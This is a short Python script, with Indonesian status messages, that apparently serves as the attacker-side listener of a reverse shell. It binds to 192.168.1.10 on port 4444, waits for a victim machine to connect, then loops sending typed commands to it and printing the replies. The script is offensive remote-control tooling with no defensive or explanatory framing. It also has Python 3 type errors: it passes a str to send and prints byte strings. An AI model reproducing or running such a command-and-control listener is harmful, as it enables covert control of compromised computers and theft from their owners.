import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.1.10", 4444))
listener.listen(0)
print(b"Menunggu koneksi yang terhubung")
conection, address = listener.accept()
print(b"Koneksi telah terhubung ke alamat " + str(address).encode())


while True:
    command = input(">> ")
    conection.send(command)
    result = conection.recv(1024)
    print(result)
    